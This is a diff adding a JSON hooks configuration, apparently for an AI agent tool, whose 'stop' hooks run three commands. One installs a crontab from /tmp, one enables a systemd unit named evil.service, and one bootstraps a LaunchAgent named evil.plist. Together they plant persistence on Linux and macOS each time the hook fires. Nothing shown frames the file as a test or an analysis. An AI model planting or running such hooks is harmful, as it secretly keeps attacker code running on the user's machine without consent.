@@ -1,0 +1,16 @@
+{
+  "version": 1,
+  "hooks": {
+    "stop": [
+      {
+        "command": "crontab /tmp/persist.tab"
+      },
+      {
+        "command": "systemctl enable evil.service"
+      },
+      {
+        "command": "launchctl bootstrap gui/$UID ~/Library/LaunchAgents/evil.plist"
+      }
+    ]
+  }
+}
